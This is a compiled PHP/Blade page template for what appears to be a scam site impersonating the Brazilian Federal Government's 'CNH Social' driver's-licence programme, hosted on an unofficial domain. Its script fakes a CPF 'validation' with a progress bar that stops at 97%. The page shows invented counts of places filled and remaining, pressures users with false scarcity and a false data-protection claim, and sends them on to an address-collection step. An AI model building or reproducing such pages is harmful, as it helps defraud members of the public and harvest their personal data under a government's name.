<?php $__env->startSection('content'); ?>
    <div class="min-h-screen bg-background flex flex-col">
        <?php echo $__env->make('components.header', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?>
        <main class="flex-1 px-4 py-6">
            <div class="max-w-2xl mx-auto">
                <div class="mb-6 text-sm">
                    <span class="text-govBlue hover:underline cursor-pointer">Início</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">Serviços</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">CNH</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-foreground">Resultado</span>
                </div>
                <div class="bg-card rounded-lg shadow-md border border-border p-6 space-y-6">
                    <div class="text-center space-y-4">
                        <h1 class="text-2xl md:text-3xl font-bold text-[#1B4F9B]">Parabéns, <span class="firstName uppercase"></span>!</h1>
                        <p class="text-base text-foreground">Seu CPF foi validado no programa CNH Social Digital 2025.</p>
                    </div>
                    <div class="flex justify-center py-6">
                        <div class="relative w-48 h-48">
                            <svg class="w-full h-full transform -rotate-90">
                                <circle cx="96" cy="96" r="88"
                                    stroke="currentColor" stroke-width="12"
                                    fill="none" class="text-muted">
                                </circle>

                                <circle id="progress-circle"
                                    cx="96" cy="96" r="88"
                                    stroke="currentColor" stroke-width="12"
                                    fill="none"
                                    class="text-[#1B4F9B]"
                                    stroke-linecap="round">
                                </circle>
                            </svg>

                            <div class="absolute inset-0 flex items-center justify-center">
                                <span id="percent-text" class="text-5xl font-bold text-[#1B4F9B]">0%</span>
                            </div>
                        </div>
                    </div>
                    <div class="text-center">
                        <p class="text-foreground">Finalize seu cadastro para garantir sua vaga. <span class="inline-flex gap-1"><span class="w-2 h-2 rounded-full bg-[#1B4F9B] animate-pulse"></span><span class="w-2 h-2 rounded-full bg-[#1B4F9B] animate-pulse delay-75"></span><span class="w-2 h-2 rounded-full bg-[#1B4F9B] animate-pulse delay-150"></span></span></p>
                    </div>
                    <div class="grid grid-cols-2 gap-6 py-6 border-t border-b border-border">
                        <div class="text-center">
                            <div class="text-3xl font-bold text-[#1B4F9B]">3.445.900</div>
                            <div class="text-sm text-muted-foreground mt-1">Realizados</div>
                        </div>
                        <div class="text-center">
                            <div class="text-3xl font-bold text-[#1B4F9B]">6.850</div>
                            <div class="text-sm text-muted-foreground mt-1">Disponíveis</div>
                        </div>
                    </div>
                    <div class="bg-green-50 p-4 rounded-lg space-y-3">
                        <div class="flex items-start gap-3">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check h-6 w-6 text-green-600 mt-0.5 flex-shrink-0"><circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path></svg>
                            <div>
                                <h3 class="text-base font-bold text-green-800">Processo 100% Seguro</h3>
                                <p class="text-sm text-foreground mt-1">Seus dados são protegidos pelos mais altos padrões de segurança, com certificação de proteção de dados em conformidade com a LGPD. Após a verificação bem-sucedida, você será redirecionado para a área de finalização de cadastro.</p>
                            </div>
                        </div>
                    </div>
                    <div class="bg-blue-50 p-4 rounded-lg">
                        <div class="flex items-center justify-center gap-2 text-[#1B4F9B]">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-help h-5 w-5"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><path d="M12 17h.01"></path></svg>
                            <span class="text-sm font-medium">Dúvidas sobre o processo de verificação?</span>
                        </div>
                    </div>
                    <div class="bg-blue-100 border-2 border-[#1B4F9B] rounded-lg p-4">
                        <h3 class="text-lg font-bold text-[#1B4F9B] text-center mb-2">Atenção!</h3>
                        <p class="text-sm text-foreground text-center">Restam poucas vagas disponíveis no Programa CNH Social. Não perca a oportunidade de garantir seu benefício!</p>
                    </div>
                    <button id="btnContinuar" class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md px-8 w-full py-6 text-lg font-semibold bg-[#1B4F9B] hover:bg-[#1B4F9B]/90 text-white" disabled>Emitir Cadastro</button>
                </div>
            </div>
        </main>
        <footer class="mt-8 py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; <?php echo e(date('Y')); ?> <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
<?php $__env->stopSection(); ?>
<?php $__env->startSection('javascript'); ?>
<script>
const userData = JSON.parse(sessionStorage.getItem("userData"));
if(!userData){
    window.location.href = "<?php echo e(url('/login')); ?>";
} 
const primeiroNome = userData.NOME.split(' ')[0];
$('.firstName').text(primeiroNome);

const circle = document.querySelector("#progress-circle");
const percentText = document.querySelector("#percent-text");

const totalDuration = 6000;
const fps = 60;

const radius = 88;
const circumference = 2 * Math.PI * radius;
let progress = 0;

const maxPercent = 97;

circle.style.strokeDasharray = circumference;

function animateProgress() {
    progress += maxPercent / (totalDuration / (1000 / fps));

    if (progress > maxPercent) progress = maxPercent;

    const offset = circumference - (progress / 100) * circumference;
    circle.style.strokeDashoffset = offset;

    percentText.textContent = Math.round(progress) + "%";

    if (progress < maxPercent) {
        requestAnimationFrame(animateProgress);
    }

    if(progress == maxPercent){
        $('#btnContinuar').attr('disabled', false);
    }
}

animateProgress();

$(document).on('click', '#btnContinuar', function(){
    window.location.href = "<?php echo e(url('/endereco')); ?>";
})
</script>
<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?><?php /**PATH /var/www/areadev.site/public_html/cnhsocial/resources/views/resultado.blade.php ENDPATH**/ ?>